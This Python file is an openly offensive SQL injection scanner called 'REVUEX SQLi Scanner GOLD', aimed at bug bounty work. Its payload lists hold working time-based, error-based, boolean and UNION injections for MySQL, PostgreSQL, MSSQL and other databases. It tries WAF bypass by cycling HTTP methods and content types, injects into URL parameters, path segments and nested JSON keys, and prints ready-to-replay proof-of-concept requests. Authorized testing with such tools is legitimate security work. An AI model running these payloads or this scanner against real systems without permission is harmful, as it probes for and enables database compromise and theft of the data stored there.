#!/usr/bin/env python3
"""
REVUEX SQLi Framework v3.5-GOLD
===============================
A 10/10 Private Research Grade Scanner for Bug Bounty Professionals.

Techniques:
- Structural Integrity JSON Mutation (Deep-Copy recursive injection)
- Triple-Check Boolean Logic (True != False verification)
- Method & Content-Type Confusion (WAF Bypass)
- Second-Order Marker Injection (Non-destructive tracking)
- Surgical Path Injection (Routing-aware encoding)
- Error Inverse Verification (' then '' confirmation)
- Statistical Time-Based Detection (5-sample median analysis)

Author: REVUEX Team
License: MIT (Private Research Use)
"""

import re
import sys
import argparse
import hashlib
import time
import difflib
import statistics
import json
import copy
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, urlencode, parse_qs, quote
from datetime import datetime, timezone
from enum import Enum
from dataclasses import dataclass

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.base_scanner import (
    BaseScanner,
    Finding,
    ScanResult,
    Severity,
    ScanStatus,
)
from core.utils import (
    normalize_url,
    extract_domain,
    random_string,
    print_success,
    print_error,
    print_warning,
    print_info,
)


# =============================================================================
# CONSTANTS
# =============================================================================

SCANNER_NAME = "SQLi Scanner GOLD"
SCANNER_VERSION = "3.5.0"

# SQL error patterns by DBMS
SQL_ERRORS = {
    "mysql": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",
        r"mysqli_",
        r"mysql_fetch",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR",
        r"PSQLException",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"valid PostgreSQL result",
    ],
    "mssql": [
        r"\[SQL Server\]",
        r"Unclosed quotation mark",
        r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"System\.Data\.SqlClient",
    ],
    "oracle": [
        r"ORA-[0-9]{5}",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"Oracle.*Driver",
    ],
    "sqlite": [
        r"SQLite.*error",
        r"sqlite3\.OperationalError",
        r"\[SQLITE_ERROR\]",
    ],
}

# Time-based payloads for different DBMS
TIME_PAYLOADS = [
    # MySQL
    "' AND SLEEP({delay})--",
    "\" AND SLEEP({delay})--",
    "' OR SLEEP({delay})--",
    "1' AND SLEEP({delay})--",
    "') AND SLEEP({delay})--",
    # PostgreSQL
    "' AND pg_sleep({delay})--",
    "'; SELECT pg_sleep({delay})--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:{delay}'--",
    "' WAITFOR DELAY '0:0:{delay}'--",
    # Generic
    "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
]

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    "\"",
    "''",
    "\"\"",
    "`",
    "'--",
    "\"--",
    "' OR '1'='1",
    "' AND '1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
]

# Boolean payloads (true/false pairs)
BOOLEAN_PAYLOADS_STRING = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("' AND '1'='1'--", "' AND '1'='2'--"),
]

BOOLEAN_PAYLOADS_NUMERIC = [
    (" AND 1=1", " AND 1=2"),
    (" OR 1=1", " OR 1=2"),
    ("-1 OR 1=1", "-1 OR 1=2"),
    ("1 AND 1=1", "1 AND 1=2"),
]

# HTTP methods to test
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH"]

# Content types to test (WAF bypass via content-type confusion)
CONTENT_TYPES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "text/plain",
    "text/xml",
]


# =============================================================================
# JSON MUTATION ENGINE
# =============================================================================

class MutationEngine:
    """Deep-copy recursive JSON mutation for structural integrity testing."""
    
    @staticmethod
    def mutate_json_recursive(obj: Any, target_key: str, payload: str) -> Any:
        """
        Recursively mutate a specific key in a JSON structure.
        Preserves structural integrity while injecting payloads.
        
        Args:
            obj: JSON object (dict, list, or primitive)
            target_key: Key to inject payload into
            payload: SQL injection payload
        
        Returns:
            Mutated copy of the object
        """
        if isinstance(obj, dict):
            result = {}
            for key, value in obj.items():
                if key == target_key:
                    # Inject payload - append to existing value
                    if isinstance(value, str):
                        result[key] = f"{value}{payload}"
                    elif isinstance(value, (int, float)):
                        result[key] = f"{value}{payload}"
                    else:
                        result[key] = value
                else:
                    result[key] = MutationEngine.mutate_json_recursive(value, target_key, payload)
            return result
        
        elif isinstance(obj, list):
            return [MutationEngine.mutate_json_recursive(item, target_key, payload) for item in obj]
        
        else:
            return obj
    
    @staticmethod
    def get_all_keys(obj: Any, prefix: str = "") -> List[str]:
        """Extract all keys from nested JSON structure."""
        keys = []
        
        if isinstance(obj, dict):
            for key, value in obj.items():
                full_key = f"{prefix}.{key}" if prefix else key
                keys.append(full_key)
                keys.extend(MutationEngine.get_all_keys(value, full_key))
        
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                keys.extend(MutationEngine.get_all_keys(item, f"{prefix}[{i}]"))
        
        return keys


# =============================================================================
# INJECTION POINT DATACLASS
# =============================================================================

@dataclass
class InjectionPoint:
    """Represents a potential injection point."""
    location: str       # "url", "path", "json", "header"
    key: Any           # Parameter name or path index
    value: Any         # Original value
    method: str = "GET"
    content_type: str = "application/json"
    
    @property
    def identifier(self) -> str:
        return f"{self.method}:{self.location}:{self.key}"


# =============================================================================
# SQLi SCANNER GOLD CLASS
# =============================================================================

class SQLiScanner(BaseScanner):
    """
    GOLD-tier SQL Injection scanner with advanced detection techniques.
    
    Features:
    - Structural JSON mutation (recursive deep injection)
    - Statistical time-based detection (5-sample median)
    - Method & Content-Type confusion (WAF bypass)
    - Second-order marker injection
    - Path injection with routing awareness
    - Error inverse verification
    
    Usage:
        scanner = SQLiScanner(
            target="https://example.com/api/user?id=1",
            json_body={"user": {"name": "test", "role": "user"}},
            time_delay=5
        )
        result = scanner.run()
    """
    
    def __init__(
        self,
        target: str,
        time_delay: int = 5,
        json_body: Optional[Dict] = None,
        level: int = 3,
        test_methods: bool = True,
        test_content_types: bool = True,
        statistical_samples: int = 5,
        **kwargs
    ):
        """
        Initialize SQLi GOLD Scanner.
        
        Args:
            target: Target URL to scan
            time_delay: Delay for time-based detection (seconds)
            json_body: JSON body for POST/PUT requests
            level: Scan intensity (1-3)
            test_methods: Test multiple HTTP methods
            test_content_types: Test content-type confusion
            statistical_samples: Number of samples for time-based stats
            **kwargs: Additional BaseScanner arguments
        """
        super().__init__(
            name="SQLiScanner",
            description="SQL Injection scanner",
            target=target,
            **kwargs
        )
        
        self.time_delay = time_delay
        self.json_body = json_body or {}
        self.level = min(max(level, 1), 3)
        self.test_methods = test_methods
        self.test_content_types = test_content_types
        self.statistical_samples = statistical_samples
        
        # Detection state
        self.baseline_stats: Dict[str, Any] = {}
        self.vulnerable_params: Set[str] = set()
        self.second_order_markers: List[str] = []
        self.detected_dbms: Optional[str] = None
        
        # Scanner info
        self.scanner_name = SCANNER_NAME
        self.scanner_version = SCANNER_VERSION
    
    def _validate_target(self) -> bool:
        """Validate target is accessible."""
        try:
            response = self.session.get(
                self.target,
                timeout=self.timeout,
                allow_redirects=True
            )
            return response.status_code < 500
        except Exception as e:
            self.logger.error(f"Target validation failed: {e}")
            return False
    
    def scan(self) -> None:
        """Execute the GOLD SQLi scan."""
        self.logger.info(f"Starting SQLi GOLD scan on {self.target}")
        
        # Capture baseline with statistical analysis
        self._capture_baseline()
        
        # Get all injection points
        injection_points = self._get_injection_points()
        
        if not injection_points:
            self.logger.warning("No injection points found")
            return
        
        self.logger.info(f"Found {len(injection_points)} injection point(s)")
        
        # Test each injection point
        for point in injection_points:
            # Determine methods and content types to test
            methods = HTTP_METHODS if self.test_methods else [point.method]
            content_types = CONTENT_TYPES[:2] if self.test_content_types else [point.content_type]
            
            for method in methods:
                for content_type in content_types:
                    point.method = method
                    point.content_type = content_type
                    
                    # Skip if already found vulnerable
                    if point.identifier in self.vulnerable_params:
                        continue
                    
                    self.logger.debug(f"Testing {method} [{content_type}] -> {point.key}")
                    
                    # Run detection techniques
                    self._test_error_inverse(point)
                    self._test_boolean_hardened(point)
                    
                    if self.level >= 2:
                        self._test_time_statistical(point)
        
        # Log second-order markers for manual verification
        if self.second_order_markers:
            self.logger.info(f"Second-order markers injected: {len(self.second_order_markers)}")
            self.logger.debug(f"Markers: {self.second_order_markers[:5]}...")
        
        self.logger.info(f"SQLi GOLD scan complete. Found {len(self.findings)} issue(s)")
    
    # =========================================================================
    # INJECTION POINT DISCOVERY
    # =========================================================================
    
    def _get_injection_points(self) -> List[InjectionPoint]:
        """
        Discover all potential injection points.
        
        Returns:
            List of InjectionPoint objects
        """
        points = []
        parsed = urlparse(self.target)
        
        # 1. URL Query Parameters
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        for key, values in query_params.items():
            value = values[0] if values else ""
            points.append(InjectionPoint(
                location="url",
                key=key,
                value=value
            ))
        
        # 2. Path Segments (surgical path injection)
        path_parts = parsed.path.split("/")
        for i, part in enumerate(path_parts):
            if part and (part.isdigit() or any(c.isdigit() for c in part)):
                points.append(InjectionPoint(
                    location="path",
                    key=i,
                    value=part
                ))
        
        # 3. JSON Body (recursive mapping)
        if self.json_body:
            self._map_json_keys(self.json_body, points)
        
        return points
    
    def _map_json_keys(self, obj: Any, points: List[InjectionPoint], prefix: str = "") -> None:
        """Recursively map JSON keys as injection points."""
        if isinstance(obj, dict):
            for key, value in obj.items():
                full_key = f"{prefix}.{key}" if prefix else key
                
                if isinstance(value, (str, int, float)):
                    points.append(InjectionPoint(
                        location="json",
                        key=key,  # Use simple key for mutation
                        value=value,
                        method="POST"
                    ))
                else:
                    self._map_json_keys(value, points, full_key)
        
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                self._map_json_keys(item, points, f"{prefix}[{i}]")
    
    # =========================================================================
    # REQUEST MUTATION ENGINE
    # =========================================================================
    
    def _make_mutated_request(
        self,
        point: InjectionPoint,
        payload: str
    ) -> Tuple[Optional[Any], float]:
        """
        Make a request with mutated payload.
        
        Args:
            point: Injection point
            payload: SQL payload to inject
        
        Returns:
            Tuple of (response, elapsed_time)
        """
        self.rate_limiter.acquire()
        self._request_count += 1
        
        # Generate second-order marker
        marker = f"REVUEX_{hashlib.md5(payload.encode()).hexdigest()[:6]}"
        full_payload = f"{payload}/*{marker}*/"
        
        # Prepare headers
        headers = dict(self.session.headers)
        headers["Content-Type"] = point.content_type
        
        # Parse target URL
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        data = None
        
        # Mutate based on injection location
        if point.location == "url":
            # URL parameter injection
            params[point.key] = [f"{point.value}{full_payload}"]
        
        elif point.location == "path":
            # Surgical path injection with encoding
            parts = parsed.path.split("/")
            if isinstance(point.key, int) and point.key < len(parts):
                original = parts[point.key]
                parts[point.key] = f"{quote(str(original))}{quote(full_payload)}"
                parsed = parsed._replace(path="/".join(parts))
        
        elif point.location == "json":
            # Deep JSON mutation
            mutated_body = MutationEngine.mutate_json_recursive(
                copy.deepcopy(self.json_body),
                point.key,
                full_payload
            )
            data = json.dumps(mutated_body)
        
        # Build final URL
        url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
        
        try:
            start_time = time.time()
            response = self.session.request(
                method=point.method,
                url=url,
                headers=headers,
                data=data,
                timeout=self.timeout + self.time_delay + 2,
                allow_redirects=True
            )
            elapsed = time.time() - start_time
            
            # Track second-order marker
            self.second_order_markers.append(marker)
            
            time.sleep(self.delay)
            return response, elapsed
            
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return None, 0
    
    # =========================================================================
    # DETECTION TECHNIQUES
    # =========================================================================
    
    def _test_error_inverse(self, point: InjectionPoint) -> None:
        """
        Error Inverse Verification technique.
        
        Tests: ' causes error, '' does not (proves SQL context)
        """
        # Test single quote - should cause error
        resp1, _ = self._make_mutated_request(point, "'")
        if resp1 is None:
            return
        
        error1 = self._detect_sql_error(resp1.text)
        if not error1:
            return
        
        # Test double quote - should NOT cause error (escaped)
        resp2, _ = self._make_mutated_request(point, "''")
        if resp2 is None:
            return
        
        error2 = self._detect_sql_error(resp2.text)
        
        # Confirmed: single quote errors, double quote doesn't
        if error1 and not error2:
            self.vulnerable_params.add(point.identifier)
            self.detected_dbms = error1
            
            finding = Finding(
                id=self._generate_finding_id(f"sqli_error_inverse_{point.key}"),
                title=f"Confirmed Error-Based SQLi ({error1.upper()})",
                severity=Severity.CRITICAL,
                description=(
                    f"Error-inverse verification confirmed SQL injection in '{point.key}'. "
                    f"Single quote (') triggers SQL error, while escaped quote ('') does not, "
                    f"proving the input is interpreted as SQL syntax."
                ),
                url=self.target,
                parameter=str(point.key),
                method=point.method,
                payload="' (error) vs '' (no error)",
                evidence=f"DBMS: {error1}, Location: {point.location}",
                impact=(
                    "CRITICAL: Confirmed SQL injection allows complete database compromise:\n"
                    "- Full data extraction (credentials, PII, secrets)\n"
                    "- Authentication bypass\n"
                    "- Data modification/deletion\n"
                    "- Potential RCE via xp_cmdshell/INTO OUTFILE"
                ),
                remediation=(
                    "1. Use parameterized queries (prepared statements) - MANDATORY\n"
                    "2. Use stored procedures with parameterized inputs\n"
                    "3. Implement strict input validation (allowlist)\n"
                    "4. Apply least privilege to database accounts\n"
                    "5. Deploy WAF as defense-in-depth (not primary fix)"
                ),
                vulnerability_type="sqli",
                confidence="high",
            )
            self.add_finding(finding)
            
            self._print_poc(point, "'", resp1)
    
    def _test_boolean_hardened(self, point: InjectionPoint) -> None:
        """
        Hardened Boolean-Based detection with triple verification.
        
        Verifies: TRUE response == baseline, FALSE response != baseline, TRUE != FALSE
        """
        if point.identifier in self.vulnerable_params:
            return
        
        # Select payloads based on value type
        if isinstance(point.value, (int, float)) or str(point.value).isdigit():
            payloads = BOOLEAN_PAYLOADS_NUMERIC
        else:
            payloads = BOOLEAN_PAYLOADS_STRING
        
        for true_payload, false_payload in payloads:
            # Test TRUE condition
            resp_true, _ = self._make_mutated_request(point, true_payload)
            if resp_true is None:
                continue
            
            # Test FALSE condition
            resp_false, _ = self._make_mutated_request(point, false_payload)
            if resp_false is None:
                continue
            
            # Triple verification:
            # 1. TRUE response similar to baseline
            true_is_baseline = self._is_similar_to_baseline(resp_true)
            
            # 2. FALSE response different from baseline
            false_is_different = not self._is_similar_to_baseline(resp_false)
            
            # 3. TRUE and FALSE responses differ from each other
            responses_differ = self._responses_differ(resp_true, resp_false)
            
            if true_is_baseline and false_is_different and responses_differ:
                self.vulnerable_params.add(point.identifier)
                
                finding = Finding(
                    id=self._generate_finding_id(f"sqli_boolean_{point.key}"),
                    title="Hardened Boolean-Based Blind SQLi",
                    severity=Severity.HIGH,
                    description=(
                        f"Triple-verified Boolean-based SQL injection in '{point.key}'. "
                        f"TRUE condition matches baseline, FALSE differs, confirming "
                        f"SQL logic interpretation."
                    ),
                    url=self.target,
                    parameter=str(point.key),
                    method=point.method,
                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    evidence=(
                        f"TRUE len: {len(resp_true.text)}, "
                        f"FALSE len: {len(resp_false.text)}, "
                        f"Baseline len: {self.baseline_stats.get('len', 0)}"
                    ),
                    impact=(
                        "Boolean-based blind SQLi enables bit-by-bit data extraction:\n"
                        "- Extract usernames, passwords, secrets\n"
                        "- Map database structure\n"
                        "- Slower but equally dangerous as error-based"
                    ),
                    remediation=(
                        "1. Use parameterized queries (prepared statements)\n"
                        "2. Implement strict input validation\n"
                        "3. Use ORM frameworks with proper escaping\n"
                        "4. Apply principle of least privilege"
                    ),
                    vulnerability_type="sqli",
                    confidence="high",
                )
                self.add_finding(finding)
                
                self._print_poc(point, true_payload, resp_true)
                break
    
    def _test_time_statistical(self, point: InjectionPoint) -> None:
        """
        Statistical Time-Based detection.
        
        Takes multiple samples and uses median to eliminate network jitter.
        """
        if point.identifier in self.vulnerable_params:
            return
        
        baseline_time = self.baseline_stats.get("time", 1.0)
        threshold = baseline_time + self.time_delay - 0.7  # 0.7s tolerance
        
        for payload_template in TIME_PAYLOADS:
            payload = payload_template.format(delay=self.time_delay)
            times = []
            
            # Collect multiple samples
            for _ in range(self.statistical_samples):
                _, elapsed = self._make_mutated_request(point, payload)
                times.append(elapsed)
            
            # Remove outliers (first and last after sorting)
            times.sort()
            if len(times) >= 3:
                trimmed = times[1:-1]  # Remove min and max
            else:
                trimmed = times
            
            median_time = statistics.median(trimmed)
            
            # Check if median exceeds threshold
            if median_time >= threshold:
                self.vulnerable_params.add(point.identifier)
                
                finding = Finding(
                    id=self._generate_finding_id(f"sqli_time_{point.key}"),
                    title="Statistical Time-Based Blind SQLi",
                    severity=Severity.HIGH,
                    description=(
                        f"Time-based SQL injection confirmed in '{point.key}' using "
                        f"statistical analysis ({self.statistical_samples} samples). "
                        f"Median response time: {median_time:.2f}s (expected delay: {self.time_delay}s)."
                    ),
                    url=self.target,
                    parameter=str(point.key),
                    method=point.method,
                    payload=payload,
                    evidence=(
                        f"Median: {median_time:.2f}s, "
                        f"Baseline: {baseline_time:.2f}s, "
                        f"Threshold: {threshold:.2f}s, "
                        f"Samples: {times}"
                    ),
                    impact=(
                        "Time-based blind SQLi allows data extraction via timing:\n"
                        "- Works even when no output is visible\n"
                        "- Can bypass many security controls\n"
                        "- Slower but reliable extraction"
                    ),
                    remediation=(
                        "1. Use parameterized queries (prepared statements)\n"
                        "2. Implement query timeouts\n"
                        "3. Monitor slow query logs\n"
                        "4. Rate limit suspicious patterns"
                    ),
                    vulnerability_type="sqli",
                    confidence="high",
                )
                self.add_finding(finding)
                
                self._print_poc(point, payload, None)
                break
    
    # =========================================================================
    # BASELINE & HELPERS
    # =========================================================================
    
    def _capture_baseline(self) -> None:
        """Capture baseline response with statistical timing analysis."""
        latencies = []
        response = None
        
        for _ in range(3):
            try:
                start = time.time()
                response = self.session.get(self.target, timeout=self.timeout)
                latencies.append(time.time() - start)
            except Exception:
                latencies.append(self.timeout)
        
        self.baseline_stats = {
            "len": len(response.text) if response else 0,
            "time": statistics.median(latencies),
            "text": response.text[:3000] if response else "",
            "status": response.status_code if response else 0,
            "hash": hashlib.md5(response.text.encode()).hexdigest() if response else "",
        }
        
        self.logger.debug(f"Baseline: len={self.baseline_stats['len']}, time={self.baseline_stats['time']:.2f}s")
    
    def _detect_sql_error(self, text: str) -> Optional[str]:
        """Detect SQL error and return DBMS type."""
        for dbms, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return dbms
        return None
    
    def _is_similar_to_baseline(self, response) -> bool:
        """Check if response is similar to baseline."""
        if not self.baseline_stats:
            return True
        
        baseline_len = self.baseline_stats.get("len", 0)
        response_len = len(response.text)
        
        # Length difference check
        if abs(response_len - baseline_len) > 100:
            return False
        
        # Hash check
        response_hash = hashlib.md5(response.text.encode()).hexdigest()
        if response_hash == self.baseline_stats.get("hash"):
            return True
        
        # Content similarity check
        ratio = difflib.SequenceMatcher(
            None,
            response.text[:1000],
            self.baseline_stats.get("text", "")[:1000]
        ).ratio()
        
        return ratio > 0.8
    
    def _responses_differ(self, resp1, resp2) -> bool:
        """Check if two responses differ significantly."""
        # Length difference
        if abs(len(resp1.text) - len(resp2.text)) > 50:
            return True
        
        # Status code difference
        if resp1.status_code != resp2.status_code:
            return True
        
        # Content similarity
        ratio = difflib.SequenceMatcher(
            None,
            resp1.text[:1000],
            resp2.text[:1000]
        ).ratio()
        
        return ratio < 0.9
    
    def _generate_finding_id(self, context: str) -> str:
        """Generate unique finding ID."""
        data = f"{self.target}:{context}:{datetime.now().isoformat()}"
        return hashlib.md5(data.encode()).hexdigest()[:12]
    
    def _print_poc(self, point: InjectionPoint, payload: str, response) -> None:
        """Print Burp Repeater ready PoC."""
        parsed = urlparse(self.target)
        
        print_success(f"SQLi Found: {point.key} [{point.method}]")
        print(f"\n{'='*50}")
        print("BURP REPEATER POC")
        print(f"{'='*50}")
        print(f"{point.method} {parsed.path or '/'} HTTP/1.1")
        print(f"Host: {parsed.netloc}")
        print(f"Content-Type: {point.content_type}")
        print(f"\nInjection Point: {point.location}:{point.key}")
        print(f"Payload: {payload}")
        if response:
            print(f"Response Length: {len(response.text)}")
        print(f"{'='*50}\n")


# =============================================================================
# CLI INTERFACE
# =============================================================================

def create_parser() -> argparse.ArgumentParser:
    """Create CLI argument parser."""
    parser = argparse.ArgumentParser(
        prog="revuex-sqli",
        description="REVUEX SQLi GOLD Scanner - Advanced SQL Injection Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    %(prog)s -t "https://example.com/api/user?id=1"
    %(prog)s -t "https://example.com/api" --json '{"user":"test","id":1}'
    %(prog)s -t "https://example.com/search?q=test" --level 3 -v

Author: REVUEX Team
License: MIT
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("--json", type=json.loads, default={}, help="JSON body for POST requests")
    parser.add_argument("--level", type=int, choices=[1, 2, 3], default=3, help="Scan intensity (default: 3)")
    parser.add_argument("--time-delay", type=int, default=5, help="Time-based delay seconds (default: 5)")
    parser.add_argument("--samples", type=int, default=5, help="Statistical samples (default: 5)")
    parser.add_argument("--no-methods", action="store_true", help="Don't test multiple HTTP methods")
    parser.add_argument("--no-content-types", action="store_true", help="Don't test content-type confusion")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("--delay", type=float, default=0.5, help="Request delay (default: 0.5)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    parser.add_argument("--proxy", help="HTTP proxy")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    
    return parser


def main() -> int:
    """Main entry point."""
    parser = create_parser()
    args = parser.parse_args()
    
    if not args.quiet:
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║  REVUEX SQLi Scanner v{SCANNER_VERSION}-GOLD                        ║
║  Private Research Grade - Bug Bounty Professional        ║
╚═══════════════════════════════════════════════════════════╝
        """)
    
    scanner = SQLiScanner(
        target=args.target,
        json_body=args.json,
        time_delay=args.time_delay,
        level=args.level,
        test_methods=not args.no_methods,
        test_content_types=not args.no_content_types,
        statistical_samples=args.samples,
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy,
        verbose=args.verbose,
    )
    
    if args.cookie:
        scanner.session.headers["Cookie"] = args.cookie
    
    result = scanner.run()
    
    if not args.quiet:
        print(f"\n{'='*60}")
        print("SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Target: {args.target}")
        if result and hasattr(result, "duration_seconds") and result.duration_seconds:
            print(f"Duration: {result.duration_seconds:.2f}s")
        print(f"Requests: {result.total_requests}")
        print(f"Findings: {len(result.findings)}")
        
        if scanner.detected_dbms:
            print(f"Detected DBMS: {scanner.detected_dbms.upper()}")
        
        if scanner.second_order_markers:
            print(f"Second-Order Markers: {len(scanner.second_order_markers)}")
        
        if result.findings:
            print(f"\n{'='*60}")
            print("FINDINGS SUMMARY")
            print(f"{'='*60}")
            for finding in result.findings:
                sev_colors = {
                    Severity.CRITICAL: "\033[95m",
                    Severity.HIGH: "\033[91m",
                    Severity.MEDIUM: "\033[93m",
                }
                color = sev_colors.get(finding.severity, "")
                reset = "\033[0m"
                print(f"\n{color}[{finding.severity.value.upper()}]{reset} {finding.title}")
                print(f"  Parameter: {finding.parameter}")
                print(f"  Method: {finding.method}")
    
    if args.output:
        output_data = {
            "scanner": "REVUEX SQLi GOLD",
            "version": SCANNER_VERSION,
            "target": args.target,
            "scan_id": getattr(result, "scan_id", "unknown") if result else "unknown",
            "duration": getattr(result, "duration_seconds", 0) if result else 0,
            "detected_dbms": scanner.detected_dbms,
            "second_order_markers": scanner.second_order_markers[:10],
            "findings": [
                {
                    "id": f.id,
                    "title": f.title,
                    "severity": f.severity.value,
                    "parameter": f.parameter,
                    "method": getattr(f, "method", "GET"),
                    "payload": f.payload,
                    "evidence": f.evidence,
                    "remediation": f.remediation,
                }
                for f in getattr(result, "findings", [])
            ]
        }
        
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        
        if not args.quiet:
            print(f"\nResults saved to: {args.output}")
    
    return 1 if result.findings else 0


if __name__ == "__main__":
    sys.exit(main())
